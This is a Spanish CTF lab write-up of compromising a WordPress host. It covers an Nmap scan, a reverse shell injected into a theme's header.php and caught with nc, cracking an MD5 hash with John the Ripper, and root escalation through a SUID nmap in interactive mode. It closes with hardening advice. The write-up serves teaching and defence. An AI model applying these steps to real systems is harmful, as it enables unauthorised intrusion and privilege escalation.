---
tags:
  - Nmap
  - WordPress
  - SUID
  - john
---

## Contexto y alcance

Ejercicio de intrusión en entorno controlado (CTF/laboratorio). El objetivo es obtener acceso inicial, escalar privilegios y recuperar las tres llaves, documentando metodología, decisiones técnicas e indicadores. **No** aplicar en infraestructuras reales sin autorización.


## Metodología

1. **Reconocimiento activo de red y servicios** con Nmap para levantar superficie de ataque.
2. **Enumeración web** (fuzzing de rutas y revisión de archivos públicos como `robots.txt`) para descubrir contenido sensible.
3. **Fingerprinting de CMS** (WordPress 4.3.1) y descarga de diccionario expuesto (`fsocity.dic`) para futuros ataques de autenticación.
4. **Obtención de credenciales** a partir de contenido codificado en Base64 (pista en `license.txt`) y/o credenciales filtradas; acceso al panel de WP.
5. **Ejecución remota**: inyección de _reverse shell_ a través del editor de temas (`header.php`) y recepción con `nc`.
6. **Post-explotación**: recolección de artefactos en `/home/robot` y **crack** de hash MD5 con John the Ripper para pivotear a usuario `robot`.
7. **Escalada a root** mediante binario **SUID** `nmap` en modo interactivo (técnica clásica)

## Reconocimiento de red (Nmap)

Se ejecutó un escaneo agresivo para mapear puertos y versiones:

```bash
(zikuta㉿zikuta)-[~/Desktop/mrobot]
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.2.159 -oN nmap.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 17:31 CDT
Nmap scan report for 10.201.2.159
Host is up (0.24s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 89:c7:4b:e9:a5:b5:ca:1a:2f:94:3e:df:1c:d2:ee:0a (RSA)
|   256 f1:58:ae:13:c9:9d:45:67:12:87:08:23:14:28:1c:d1 (ECDSA)
|_  256 b7:1a:f8:a1:1d:2e:33:f5:ac:57:74:9a:5b:47:c6:a0 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Hallazgos**:

- 22/tcp SSH (OpenSSH 8.2p1)
- 80/tcp HTTP (Apache)
- 443/tcp HTTPS (Apache; CN=[www.example.com](http://www.example.com))
- Certificado no confiable y con CN genérico típico de laboratorios.
- Host Linux.

**Racional técnico de flags**

- `-sS`: _SYN scan_ sigiloso y rápido.
- `-sV`: _service/version detection_ para banner grabbing.
- `-sC`: _default scripts_ para enumeración inicial.
- `-p-`: todos los puertos TCP.
- `-Pn`: omite host-discovery (útil si ICMP bloqueado).
- `--min-rate 5000`: acelera el throughput del escaneo.

## Enumeración web con dir search

##### `robots.txt` y rutas sensibles

El _fuzzing_ de directorios reveló **`/robots.txt && license.txt`** con rutas de interés, incluyendo el camino a la **key-1** y al diccionario **`/fsocity.dic`**

```bash
[17:37:45] 200 - /robots.txt  
[17:37:47] 200 - /license.txt
```

>Lección: `robots.txt` no es un mecanismo de seguridad; suele filtrar rutas “disallowed” que terminan sirviendo como guías para el adversario.


### Identificación de WordPress y recursos expuestos

Se identificó **WordPress 4.3.1** y se descargó **`/fsocity.dic`** con `wget` para futuros ataques de fuerza bruta o crack de hashes:

```bash
─(zikuta㉿zikuta)-[~/Desktop/mrobot]
└─$ wget --no-check-certificate https://10.201.38.8/fsocity.dic
--2025-08-20 05:09:19--  https://10.201.38.8/fsocity.dic
Connecting to 10.201.38.8:443... connected.
WARNING: The certificate of ‘10.201.38.8’ is not trusted.
WARNING: The certificate of ‘10.201.38.8’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘10.201.38.8’
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic.1’

fsocity.dic.1                                        100%[===================================================================================================================>]   6.91M  1.34MB/s    in 5.6s    

2025-08-20 05:09:26 (1.23 MB/s) - ‘fsocity.dic.1’ saved [7245381/7245381]
```

- El certificado HTTPS no es confiable (laboratorio), por eso `--no-check-certificate`.

Adicionalmente, En el directorio **`license.txt`**  encontramos que contenia texto en **Base64** con credenciales del usuario **elliot** (pista directa para entrar al WP admin)

## Acceso inicial al servidor (WP Admin → Reverse Shell)

Con las credenciales válidas en WordPress (pista `license.txt`/usuario **elliot**), se ingresó al **Editor de temas** y se **inyectó una reverse shell PHP** en `header.php` del tema activo. Luego se activó un _listener_ con `nc` y se disparó la carga accediendo a una ruta que ejecute ese _header_. Resultado: **shell como `daemon`**



```bash
┌──(zikuta㉿zikuta)-[~/Desktop/mrobot]
└─$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.23.120.245] from (UNKNOWN) [10.201.38.8] 32990
Linux ip-10-201-38-8 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 10:43:44 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

El banner de la shell remota confirma kernel/OS y el _uid/gid_ del proceso: 

`**uid=1(daemon**` 

## Post-explotación como `daemon` → usuario `robot`

### 5.1 Discovery en `/home/robot`

Se localizaron dos archivos:

- `key-2-of-3.txt` (sin permisos de lectura).
- `password.raw-md5` con el hash de **robot**.

```bash
ls$ 
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Con **John the Ripper** y el **diccionario `fsocity.dic`**, se crackeó el hash:

```bash
(zikuta㉿zikuta)-[~/Desktop/mrobot]
└─$ john --format=Raw-MD5  --wordlist=fsocity.dic hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-08-20 05:50) 0g/s 14301Kp/s 14301Kc/s 14301KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed. 
```

La contraseña resultó ser el **abecedario** en minúsculas (esto se comprobo gracias a `crackstation`) . Tras autenticar como **robot**, se pudo leer la **key-2**.
conseguimos la segunda llave de forma exitosa !!

```bash
$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ ls    
key-2-of-3.txt  password.raw-md5
```

## Escalada de privilegios a `root`

### 6.1 Revisión de tareas programadas

Se inspeccionó `/etc/crontab`; no se observaron ganchos triviales para abuso directo, salvo un `agent.bin` de Bitnami que no presentaba un vector evidente.

```bash
$ cat /etc/crontab
29 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D
$ ls -la
```

no encontramos nada interesante por el momento asi que el siguiente paso es buscar archivos con permisos SUID

### Enumeración de binarios SUID

La búsqueda de SUID arrojó un hallazgo crítico: **`/usr/local/bin/nmap`** con bit SUID activo.

```bash
 find / -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

La versión de `nmap` permitía **modo interactivo**:

```bash
$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
nmap> !sh
root@ip-10-201-38-8:
```

Este vector es un clásico: el **modo interactivo** de Nmap (presente en versiones antiguas como la 3.81 que muestra el sistema) permitía ejecutar comandos de sistema con `!sh`, convirtiéndose en una **escalada a root** inmediata. Tras ello, se accedió a `/root/key-3-of-3.txt`

>Observación: en entornos modernos, ese modo está retirado; por eso encontrar un **Nmap antiguo con SUID** es un indicador de **configuración insegura/legado** perfecto para escalar.

```bash
root@ip-10-201-38-8:/# cd root
root@ip-10-201-38-8:/root# ls
firstboot_done  key-3-of-3.txt
```

## Evidencias clave 

- **Puertos/servicios** (22, 80, 443) y certificado CN genérico: **Nmap output**.
- **`robots.txt`** con rutas “pista” y descarga de **`fsocity.dic`**: **fuzzing / wget logs**.
- **Pista `license.txt` → credenciales `elliot`** (Base64): **mención y flujo**.
- **Reverse shell** por `header.php` → **uid=daemon** y banner del kernel: **sesión `nc`**.
- **Hash MD5** (`password.raw-md5`) → **crack** con John y `fsocity.dic`: **pivot a `robot`**.
- **SUID `nmap`** → **modo interactivo** → **root** → `key-3-of-3.txt`

## Análisis y recomendaciones

### Causas raíz

1. **Exposición de rutas sensibles** en `robots.txt` y archivos “pista” (`fsocity.dic`, `license.txt`) → **divulgación de información**.
2. **WordPress sin endurecimiento** (posible explotación vía credenciales filtradas/recicladas) y capacidad de modificar **temas** (RCE fácil).
3. **Binario SUID heredado (`nmap`) con modo interactivo** → escalada inmediata.


### Controles defensivos propuestos

- **Higiene de contenidos**: no publicar diccionarios/archivos con credenciales ni pistas en producción; minimizar y auditar `robots.txt`.

**Endurecimiento de WordPress**:

- Desactivar el **Editor de archivos** en el dashboard (`DISALLOW_FILE_EDIT`),
- _Least privilege_ para cuentas; 2FA; rotación de contraseñas; actualización de versión y plugins.

**Gestión de SUID**:

- Inventario y **eliminación de SUID innecesarios** (especialmente herramientas de red como Nmap antiguas).
- _AppArmor/SELinux_ y auditorías periódicas de permisos.

**Monitoreo/IoC**:

- Alertas ante cambios en archivos de temas, conexiones salientes inusuales (reverse shells) y ejecución de binarios SUID.

## Procedimiento reproducible 

1. **Nmap** para superficie de ataque (flags explicados arriba).
2. **Enumeración** → `robots.txt` → localizar `key-1` y `fsocity.dic`; descargar diccionario.
3. **Decodificar `license.txt`** (Base64) → **credenciales `elliot`** → login WordPress.
4. **Editor de temas** → _reverse shell_ en `header.php` → recibir shell `daemon` con `nc`.
5. **`/home/robot`** → extraer `password.raw-md5` → **John + fsocity.dic** → contraseña `robot`.
6. **SUID** → `nmap --interactive` → `!sh` → **root** → `key-3`.


## Conclusión

El compromiso del host se consiguió combinando **divulgación de información** (rutas y ficheros públicos), **configuración laxa del CMS** (capacidad de escribir código desde el panel) y un **binario SUID obsoleto** que permitió **escalar a root** sin complejidad. Las mitigaciones propuestas son directas y de alto impacto.